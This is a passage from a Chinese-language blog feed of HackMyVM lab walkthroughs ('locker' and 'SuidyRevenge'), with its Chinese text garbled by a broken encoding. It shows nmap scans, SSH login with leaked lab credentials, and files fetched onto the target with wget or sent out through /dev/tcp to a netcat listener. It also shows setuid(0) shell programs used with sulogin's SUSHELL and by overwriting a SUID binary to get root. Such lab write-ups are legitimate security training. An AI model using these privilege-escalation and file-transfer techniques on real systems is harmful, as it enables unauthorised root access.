gcc tmp<span class="selector-class">.c</span> -o locker -static</span><br><span class="line">                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-<span class="selector-attr">[~/tmp]</span></span><br><span class="line">â””â”€# python3 -m http<span class="selector-class">.server</span> <span class="number">80</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span><span class="selector-class">.0</span><span class="selector-class">.0</span> port <span class="number">80</span> (http://<span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">80</span>/) ...</span><br><span class="line"></span><br><span class="line">www-data<span class="keyword">@locker</span>:~$ cd /tmp</span><br><span class="line">www-data<span class="keyword">@locker</span>:/tmp$ wget <span class="number">192.168</span>.<span class="number">179.83</span>/locker</span><br><span class="line">--<span class="number">2025</span>-<span class="number">02</span>-<span class="number">10</span> <span class="number">03</span>:<span class="number">26</span>:<span class="number">06</span>--  <span class="attribute">http</span>://<span class="number">192.168</span>.<span class="number">179.83</span>/locker</span><br><span class="line">Connecting to <span class="number">192.168</span>.<span class="number">179.83</span>:<span class="number">80</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Length</span>: <span class="number">70536</span> (<span class="number">69</span>K) [application/octet-stream]</span><br><span class="line">Saving <span class="attribute">to</span>: <span class="string">&#x27;locker&#x27;</span></span><br><span class="line"></span><br><span class="line">locker                         <span class="number">0%</span>[                                               ]       <span class="number">0</span>  --.-KB/s              locker                       <span class="number">100%</span>[==============================================&gt;]  <span class="number">68.88</span>K  --.-KB/s    in <span class="number">0.005s</span>  </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">02</span>-<span class="number">10</span> <span class="number">03</span>:<span class="number">26</span>:<span class="number">07</span> (<span class="number">14.8</span> MB/s) - <span class="string">&#x27;locker&#x27;</span> saved [<span class="number">70536</span>/<span class="number">70536</span>]</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæœ‰ä¸€ç‚¹è¦æ³¨æ„ï¼Œå¦‚æœç¼–è¯‘çš„æ—¶å€™åé¢æ²¡æœ‰åŠ ä¸Š-staticï¼Œå°±ä¸æ˜¯é™æ€é“¾æ¥å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆä¸ä¾èµ–åŠ¨æ€åº“ï¼‰<br>ä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘è¿™ä¹ˆåšäº†ä¹‹åæ˜¾ç¤ºexec format error<br>æˆ‘å°±æ”¹æˆç”¨pythonè„šæœ¬äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MOONSCRIPT"><figure class="iseeu highlight /moonscript"><table><tr><td class="code"><pre><span class="line">#!/bin/python3</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="built_in">os</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">os</span>.setuid(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">os</span>.setgid(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">os</span>.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@locker</span><span class="symbol">:/tmp</span><span class="variable">$ </span>wget <span class="number">192.168</span>.<span class="number">179.83</span>/setuid.py</span><br><span class="line">--<span class="number">2025</span>-<span class="number">02</span>-<span class="number">10</span> <span class="number">03</span><span class="symbol">:</span><span class="number">52</span><span class="symbol">:</span><span class="number">30</span>--  <span class="symbol">http:</span>/<span class="regexp">/192.168.179.83/setuid</span>.py</span><br><span class="line"><span class="title class_">Connecting</span> to <span class="number">192.168</span>.<span class="number">179.83</span><span class="symbol">:</span><span class="number">80</span>... connected.</span><br><span class="line"><span class="variable constant_">HTTP</span> request sent, awaiting response... <span class="number">200</span> <span class="variable constant_">OK</span></span><br><span class="line"><span class="title class_">Length</span>: <span class="number">134</span> [text/x-python]</span><br><span class="line"><span class="title class_">Saving</span> <span class="symbol">to:</span> <span class="string">&#x27;setuid.py&#x27;</span></span><br><span class="line"></span><br><span class="line">setuid.py           <span class="number">100</span><span class="string">%[===================&gt;]</span>     <span class="number">134</span>  --.-<span class="variable constant_">KB</span>/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">02</span>-<span class="number">10</span> <span class="number">03</span><span class="symbol">:</span><span class="number">52</span><span class="symbol">:</span><span class="number">30</span> (<span class="number">1.62</span> <span class="variable constant_">MB</span>/s) - <span class="string">&#x27;setuid.py&#x27;</span> saved [<span class="number">134</span>/<span class="number">134</span>]</span><br><span class="line"></span><br><span class="line">www-data<span class="variable">@locker</span><span class="symbol">:/tmp</span><span class="variable">$ </span>chmod +x setuid.py</span><br><span class="line">www-data<span class="variable">@locker</span><span class="symbol">:/tmp</span><span class="variable">$ </span>export <span class="variable constant_">SUSHELL</span>=<span class="regexp">/tmp/setuid</span>.py</span><br><span class="line">www-data<span class="variable">@locker</span><span class="symbol">:/tmp</span><span class="variable">$ </span>/usr/sbin/sulogin -e</span><br><span class="line"><span class="title class_">Press</span> <span class="title class_">Enter</span> <span class="keyword">for</span> maintenance</span><br><span class="line">(<span class="keyword">or</span> press <span class="title class_">Control</span>-D to continue): </span><br><span class="line"><span class="variable constant_">UID</span> <span class="keyword">and</span> <span class="variable constant_">GID</span> set</span><br><span class="line">root<span class="variable">@locker</span><span class="symbol">:~</span><span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>æ€»ç»“ï¼šå­¦åˆ°äº†ä¸€èˆ¬æœ‰urlå‚æ•°çš„æ—¶å€™çš„å¦ä¸€ç§æ€è€ƒæ–¹å‘ï¼šå‘½ä»¤æ‰§è¡Œæ³¨å…¥<br>gobusterå¯ä»¥-xæŒ‡å®šåç¼€ï¼Œå¯ä»¥æ‰¾åˆ°æ›´å¤šçš„è·¯å¾„<br>suloginæ˜¯ä¸€ä¸ªæ–°å­¦ä¼šçš„ä¸œè¥¿ã€‚è¿™ä¸ªå’Œé¶æœºæ‰«ä¸åˆ°ipç„¶åè¿›å…¥singleä½†ç”¨æˆ·æ¨¡å¼çš„åŸç†æ˜¯ä¸€æ ·çš„<br>ç”¨suloginææƒå°±æ˜¯ä¿®æ”¹SUSHELLã€‚ç°åœ¨æˆ‘ä¹Ÿå­¦åˆ°ç”¨pythonæ€ä¹ˆå†™setuidçš„è„šæœ¬<br>cè¯­è¨€ç¼–è¯‘é€‰é¡¹åŠ ä¸Š -staticå°±æ˜¯ç”Ÿæˆé™æ€é“¾æ¥æ–‡ä»¶ï¼Œä¸ç”¨åŠ¨æ€åº“</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-SuidyRevenge</title>
    <url>/posts/23894.html</url>
    <content><![CDATA[<p>HMV-SuidyRevengeé¶æœºå¤ç›˜  </p>
<span id="more"></span>

<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap 192.168.58.83            </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( <span class="keyword">https</span>://nmap.org ) <span class="keyword">at</span> <span class="number">2025</span><span class="number">-03</span><span class="number">-04</span> <span class="number">21</span>:<span class="number">22</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span><span class="number">.58</span><span class="number">.83</span>)</span><br><span class="line">Host is up (<span class="number">0.00056</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  <span class="keyword">http</span></span><br><span class="line">MAC Address: F2:<span class="number">89</span>:<span class="number">91</span>:<span class="number">6</span>B:<span class="number">3</span>E:<span class="number">9</span>D (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">0.30</span> <span class="built_in">seconds</span></span><br></pre></td></tr></table></figure></div>
<p>å¸¸è§„çš„ç«¯å£ï¼Œç›´æ¥å»webé‡Œé¢çœ‹çœ‹ã€‚</p>
<h1 id="webæ¢æµ‹1"><a href="#webæ¢æµ‹1" class="headerlink" title="webæ¢æµ‹1"></a>webæ¢æµ‹1</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># curl 192.168.58.83             </span></span><br><span class="line">Im proud <span class="keyword">to</span> announce <span class="keyword">that</span> <span class="string">&quot;theuser&quot;</span> <span class="keyword">is</span> <span class="keyword">not</span> anymore <span class="keyword">in</span> our servers.</span><br><span class="line">Our admin <span class="string">&quot;mudra&quot;</span> <span class="keyword">is</span> <span class="keyword">the</span> best admin <span class="keyword">of</span> <span class="keyword">the</span> world.</span><br><span class="line">-suidy</span><br><span class="line"></span><br><span class="line">&lt;!<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;mudra&quot;</span> <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">the</span> best admin, IM IN!!!!</span><br><span class="line">He only changed <span class="keyword">my</span> password <span class="keyword">to</span> a different <span class="keyword">but</span> I had <span class="built_in">time</span></span><br><span class="line"><span class="keyword">to</span> <span class="keyword">put</span> <span class="number">2</span> backdoors (.php) <span class="keyword">from</span> <span class="keyword">my</span> KALI <span class="keyword">into</span> /supersecure <span class="keyword">to</span> keep <span class="keyword">the</span> access!</span><br><span class="line"></span><br><span class="line">-theuser</span><br><span class="line"></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œç»™å‡ºäº†å¾ˆå¤šç”¨æˆ·åï¼Œè€Œä¸”ç»™å‡ºäº†ä¸€ä¸ªç±»ä¼¼äºç”¨æˆ·å‡­æ®çš„ä¸œè¥¿<code>theuser/different</code> æˆ‘å…ˆè¯•è¯•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# ssh theuser@<span class="number">192.168</span>.<span class="number">58.83</span></span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="comment">&#x27;192.168.58.83 (192.168.58.83)&#x27; can&#x27;t be established.</span></span><br><span class="line">ED25519 <span class="keyword">key</span> fingerprint <span class="built_in">is</span> SHA256:C2ARiZ0bIPPaLPinl6orW4V74Oo6OBUH2j0JSGrwcu8.</span><br><span class="line">This <span class="keyword">key</span> <span class="built_in">is</span> <span class="built_in">not</span> known <span class="keyword">by</span> any other names.</span><br><span class="line">Are you sure you want <span class="keyword">to</span> <span class="keyword">continue</span> connecting (yes/no/[fingerprint])? yes</span><br><span class="line"><span class="symbol">Warning:</span> Permanently added <span class="comment">&#x27;192.168.58.83&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line">theuser@<span class="number">192.168</span>.<span class="number">58.83</span><span class="comment">&#x27;s password: </span></span><br><span class="line">Linux suidyrevenge <span class="number">4.19</span>.<span class="number">0</span>-<span class="number">9</span>-amd64 #<span class="number">1</span> SMP Debian <span class="number">4.19</span>.<span class="number">118</span>-<span class="number">2</span>+deb10u1 (<span class="number">2020</span>-<span class="number">06</span>-<span class="number">07</span>) x86_64</span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> <span class="keyword">each</span> program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Fri Oct  <span class="number">2</span> <span class="number">09</span>:<span class="number">19</span>:<span class="number">02</span> <span class="number">2020</span> <span class="keyword">from</span> <span class="number">192.168</span>.<span class="number">1.58</span></span><br><span class="line">theuser@suidyrevenge:~$ id</span><br><span class="line">uid=<span class="number">1004</span>(theuser) gid=<span class="number">1004</span>(theuser) groups=<span class="number">1004</span>(theuser)</span><br></pre></td></tr></table></figure></div>
<p>å‘ç°çœŸçš„å¯ä»¥ç™»å½•</p>
<h1 id="ææƒ1"><a href="#ææƒ1" class="headerlink" title="ææƒ1"></a>ææƒ1</h1><p>å³ç„¶ç™»å½•è¿›æ¥é‚£å°±çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿å§<br>æ²¡æœ‰sudoï¼Œæœ‰suid</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">theuser<span class="variable">@suidyrevenge</span>:~<span class="variable">$ </span>sudo -l</span><br><span class="line"></span><br><span class="line">We trust you have received the usual lecture from the local System</span><br><span class="line">Administrator. It usually boils down to these three <span class="symbol">things:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#1) Respect the privacy of others.</span></span><br><span class="line">    <span class="comment">#2) Think before you type.</span></span><br><span class="line">    <span class="comment">#3) With great power comes great responsibility.</span></span><br><span class="line"></span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="symbol">theuser:</span> </span><br><span class="line">Sorry, user theuser may not run sudo on suidyrevenge.</span><br><span class="line">theuser<span class="variable">@suidyrevenge</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/home/suidy</span><span class="regexp">/suidyyyyy</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/eject</span><span class="regexp">/dmcrypt-get-device</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/openssh</span><span class="regexp">/ssh-keysign</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/dbus</span>-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/umount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/sudo</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/mount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/violent</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chfn</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/passwd</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œåœ¨suidyç”¨æˆ·ç›®å½•ä¸‹é¢æœ‰ä¸€ä¸ªsuidæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">theuser@suidyrevenge:/home/suidy$ ls -al</span><br><span class="line">total 52</span><br><span class="line">drwxrwxr-x<span class="number"> 3 </span>suidy suidy   <span class="number"> 4096 </span>Oct <span class="number"> 2 </span><span class="number"> 2020 </span>.</span><br><span class="line">drwxr-xr-x<span class="number"> 8 </span>root  root    <span class="number"> 4096 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>..</span><br><span class="line">-rw-------<span class="number"> 1 </span>suidy suidy     <span class="number"> 25 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.bash_history</span><br><span class="line">-rwxrwx---<span class="number"> 1 </span>suidy suidy    <span class="number"> 220 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.bash_logout</span><br><span class="line">-rwxrwx---<span class="number"> 1 </span>suidy suidy   <span class="number"> 3526 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.bashrc</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>suidy suidy   <span class="number"> 4096 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.local</span><br><span class="line">-rw-r-----<span class="number"> 1 </span>suidy suidy    <span class="number"> 262 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>note.txt</span><br><span class="line">-rwxrwx---<span class="number"> 1 </span>suidy suidy    <span class="number"> 807 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.profile</span><br><span class="line">-rwsrws---<span class="number"> 1 </span>root  theuser<span class="number"> 16712 </span>Oct <span class="number"> 2 </span><span class="number"> 2020 </span>suidyyyyy</span><br><span class="line">theuser@suidyrevenge:/home/suidy$ file suidyyyyy </span><br><span class="line">suidyyyyy: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version<span class="number"> 1 </span>(SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=863d91411490dee69e751d36cbdc3b45b593f459, not stripped</span><br><span class="line">theuser@suidyrevenge:/home/suidy$ ./suidyyyyy </span><br><span class="line">suidy@suidyrevenge:/home/suidy$ id</span><br><span class="line">uid=1005(suidy) gid=1004(theuser) groups=1004(theuser)</span><br></pre></td></tr></table></figure></div>
<p>è¿™æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶,æ‰§è¡Œä¹‹åå‘ç°æ‹¿åˆ°suidyçš„ç”¨æˆ·äº†ã€‚æŠŠè¿™ä¸ªæ–‡ä»¶æ‹¿åˆ°æœ¬åœ°çœ‹çœ‹æ˜¯åšäº†ä»€ä¹ˆäº‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># nc -lp 1234 &gt; suidy</span></span><br><span class="line">                           </span><br><span class="line">suidy<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>cat suidyyyyy  &gt; /dev/tcp/<span class="number">192.168</span>.<span class="number">58.11</span>/<span class="number">1234</span></span><br></pre></td></tr></table></figure></div>

<p>åœ¨idaé‡Œé¢çœ‹ï¼Œå‘ç°å°±æ˜¯ä¸€ä¸ªè®¾ç½®suidç„¶åæ‹¿åˆ°shellçš„ç¨‹åº</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARDUINO"><figure class="iseeu highlight /arduino"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">setuid</span>(<span class="number">0x3EDu</span>);</span><br><span class="line">  <span class="built_in">setgid</span>(<span class="number">0x3EDu</span>);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªsuidyç›®å½•ä¸‹é¢è¿˜æœ‰ä¸€ä¸ªnote</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">suidy<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>ls</span><br><span class="line">note.txt  suidyyyyy</span><br><span class="line">suidy<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>cat note.txt</span><br><span class="line">I know that theuser is <span class="keyword">not</span> here anymore but suidyyyyy is now more secure!</span><br><span class="line">root runs the script as <span class="keyword">in</span> the past that always gives <span class="title class_">SUID</span> to suidyyyyy binary</span><br><span class="line">but this time also check the size of the file.</span><br><span class="line"><span class="title class_">WE</span> <span class="title class_">DONT</span> <span class="title class_">WANT</span> <span class="title class_">MORE</span> <span class="string">&quot;theuser&quot;</span> <span class="title class_">HERE</span>!.</span><br><span class="line"><span class="title class_">WE</span> <span class="title class_">ARE</span> <span class="title class_">SECURE</span> <span class="title class_">NOW</span>.</span><br><span class="line"></span><br><span class="line">-suidy</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œè¯´suidyyyyyæ€»æ˜¯æœ‰suidæƒé™ï¼Œè¿˜è¯´é“äº†æ£€æŸ¥fileçš„size<br>é‚£æ ¹æ®è¿™ä¸ªæç¤ºï¼Œè‚¯å®šå°±æ˜¯è¦å¯¹è¿™ä¸ªæœ‰suidçš„ç¨‹åºåšæ‰‹è„šäº†ï¼Œè€Œä¸”è¿™ä¸ªç¨‹åºè¿˜æ˜¯å±äºtheuserç»„ï¼Œæœ‰rwsæƒé™<br>å› ä¸ºè¿™ä¸ªæ–‡ä»¶çš„å±ç»„æ˜¯theuserï¼Œæˆ‘å°±å…ˆç”¨äº†theuserç”¨æˆ·å†™ä¸€ä¸ªcæ–‡ä»¶ï¼Œä½†æ˜¯è¿™ä¸ªæ–‡ä»¶çš„ç›®å½•æ˜¯suidyçš„ï¼Œtheuseræ²¡æœ‰å†™å…¥æƒé™<br>é‚£ç°åœ¨æˆ‘ä¹Ÿå†™ä¸€ä¸ªå¾—åˆ°bashçš„æ–‡ä»¶ï¼Œè®¾ç½®uidå’Œgidæ˜¯0 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">suidy@suidyrevenge:/home/suidy$ ls -al</span><br><span class="line">total 76</span><br><span class="line">drwxrwxr-x<span class="number"> 3 </span>suidy suidy   <span class="number"> 4096 </span>Mar <span class="number"> 4 </span>08:54 .</span><br><span class="line">drwxr-xr-x<span class="number"> 8 </span>root  root    <span class="number"> 4096 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>..</span><br><span class="line">-rw-------<span class="number"> 1 </span>suidy suidy     <span class="number"> 25 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.bash_history</span><br><span class="line">-rwxrwx---<span class="number"> 1 </span>suidy suidy    <span class="number"> 220 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.bash_logout</span><br><span class="line">-rwxrwx---<span class="number"> 1 </span>suidy suidy   <span class="number"> 3526 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.bashrc</span><br><span class="line">-rwxr-xr-x<span class="number"> 1 </span>suidy theuser<span class="number"> 16712 </span>Mar <span class="number"> 4 </span>08:54 hack</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>suidy theuser   <span class="number"> 97 </span>Mar <span class="number"> 4 </span>08:54 hack.c</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>suidy suidy   <span class="number"> 4096 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.local</span><br><span class="line">-rw-r-----<span class="number"> 1 </span>suidy suidy    <span class="number"> 262 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>note.txt</span><br><span class="line">-rwxrwx---<span class="number"> 1 </span>suidy suidy    <span class="number"> 807 </span>Oct <span class="number"> 1 </span><span class="number"> 2020 </span>.profile</span><br><span class="line">-rwsrws---<span class="number"> 1 </span>root  theuser<span class="number"> 16712 </span>Oct <span class="number"> 2 </span><span class="number"> 2020 </span>suidyyyyy</span><br><span class="line">suidy@suidyrevenge:/home/suidy$ cat hack.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">  setuid(0);</span><br><span class="line">  setgid(0);</span><br><span class="line">  system(&quot;/bin/bash&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>åˆšæ‰æç¤ºæˆ‘ä»¬è¯´å¤§å°ï¼Œå‘ç°è¿™ä¸ªå¤§å°ä¹Ÿæ˜¯åˆšå¥½ä¸€æ ·çš„ï¼Œçœ‹æ¥å°±æ²¡æœ‰ä»€ä¹ˆé—®é¢˜<br>ä½†æ˜¯è¿™é‡Œæˆ‘ç”¨cpå‘½ä»¤ï¼Œå‘ç°è¯´è¿™ä¸ªsuidyyyyy busyï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬è¿™ä¸ªbashå°±æ˜¯è¿è¡Œè¿™ä¸ªç¨‹åºå¾—åˆ°çš„ï¼Œé‚£æˆ‘ä»¬åˆä¸çŸ¥é“suidyçš„å¯†ç ï¼Œæ‰€ä»¥å°±ç›´æ¥åˆ é™¤è¿™ä¸ªæ–‡ä»¶å§<br>è¿‡äº†ä¸€ä¼šå‘ç°è¿™ä¸ªsuidyyyyyç¨‹åºåˆå‡ºç°äº†ï¼Œä¼°è®¡å°±æ˜¯ä¸€ä¸ªå®šæ—¶ä»»åŠ¡</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">theuser<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>ls</span><br><span class="line">hack  hack.c  note.txt  suidyyyyy</span><br><span class="line">theuser<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>cp /home/suidy/hack /home/suidy/suidyyyyy </span><br><span class="line">theuser<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>./suidyyyyy </span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">theuser<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>./suidyyyyy </span><br><span class="line">root<span class="variable">@suidyrevenge</span><span class="symbol">:/home/suidy</span><span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">1004</span>(theuser)</span><br></pre></td></tr></table></figure></div>
<p>å‘ç°æˆåŠŸäº†ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆè¿™ä¸ªæ˜¯ä¸ªhardé¶æœºå‘¢ã€‚è¿™æ ·ä¸‹æ¥ä¸€çœ‹ä¹Ÿå°±æ˜¯ä¸ªeasyã€‚ç¿»äº†ä¸€ä¸‹wpï¼Œå‘ç°åŸæ¥è¿™é‡Œwebæœ‰ç¬¬äºŒç§æ–¹å¼æ‹¿åˆ°wwwç”¨æˆ·ç„¶åææƒ</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># curl 192.168.58.83</span></span><br><span class="line">Im proud <span class="keyword">to</span> announce <span class="keyword">that</span> <span class="string">&quot;theuser&quot;</span> <span class="keyword">is</span> <span class="keyword">not</span> anymore <span class="keyword">in</span> our servers.</span><br><span class="line">Our admin <span class="string">&quot;mudra&quot;</span> <span class="keyword">is</span> <span class="keyword">the</span> best admin <span class="keyword">of</span> <span class="keyword">the</span> world.</span><br><span class="line">-suidy</span><br><span class="line"></span><br><span class="line">&lt;!<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;mudra&quot;</span> <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">the</span> best admin, IM IN!!!!</span><br><span class="line">He only changed <span class="keyword">my</span> password <span class="keyword">to</span> a different <span class="keyword">but</span> I had <span class="built_in">time</span></span><br><span class="line"><span 